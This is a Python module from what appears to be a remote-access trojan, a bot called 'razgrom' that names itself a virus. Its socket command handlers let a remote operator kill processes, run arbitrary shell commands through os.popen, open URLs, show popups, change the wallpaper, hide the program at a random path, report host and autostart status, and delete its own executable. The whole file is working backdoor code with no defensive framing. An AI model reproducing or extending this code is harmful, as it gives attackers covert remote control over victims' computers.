from modules import *

import platform
import webbrowser
import psutil
import os

import re

from modules import *

def send_status_sock(conn, l: list, i: int):
    conn.send(("Bot 'razgrom' online, host info:\n" + platform.platform() + '\n' + ("Autostart configured!" if is_in_autorun() else "Autostart unconfigured!\n")).encode())

def pkill_sock(conn, l: list, i: int):
    try:
        name = l[i+1]

        for proc in psutil.process_iter():
            if proc.name() == name:
                proc.kill()
            conn.send(("killed " + proc.name() + " successfully.\n").encode())
    except Exception as e:
        conn.send("Error!\n".encode())

def spawn_sock(conn, l: list, i: int):
    try:
        os.popen(l[i+1])
        conn.send("spawned " + l[i+1] + "successfully.\n".encode())
    except Exception as e:
        conn.send("Error!\n".encode())

def url_open_sock(conn, l: list, i: int):
    try:
        webbrowser.open(l[i+1])
    except Exception as e:
        conn.send("Error!\n".encode())

    conn.send("URL opened successfully!\n".encode())

def imgpopup_sock(conn, l: list, i: int):
    try:
        show_image_window(l[i+1])
        conn.send("Popup opened successfully.\n".encode())
    except Exception as e:
        conn.send("Error!\n".encode())

def wallpaper_sock(conn, l: list, i: int):
    try:
        imsave(l[i+1])
        set_wallpaper(os.path.abspath(os.path.join(".", "wallpaper.png")))
        conn.send("Wallpaper opened successfully.\n".encode())
    except Exception as e:
        conn.send("Error!\n".encode())

def randomhide_sock(conn, l: list, i: int):
    try:
        conn.send(("Virus hidden, new path: " + self_hide() + '\n').encode())
    except Exception as e:
        conn.send("Error!\n".encode())

def selfdestruct_sock(conn, l: list, i: int):
    try:
        os.remove(sys.executable)
        conn.send("Successful destruction!\n".encode())
        exit(0)
    except Exception as e:
        conn.send("Error!\n".encode())
    
HANDLERS_SOCKET = {
    "status": send_status_sock,
    "open": url_open_sock,
    "pkill": pkill_sock,
    "spawn": spawn_sock,
    "imgpopup": imgpopup_sock,
    "wallpaper": wallpaper_sock,
    "randomhide": randomhide_sock,
    "selfdestruct": selfdestruct_sock
}

def handle_socket_commands(conn, text):
    try:
        t = re.sub("[\n]", " ", text)

        l = t.split(" ")
        
        for i in range(len(l)):
            for key in HANDLERS_SOCKET.keys():
                if key == l[i]:
                    HANDLERS_SOCKET[key](conn, l, i)

    except Exception as e:
        conn.send("Error!\n".encode())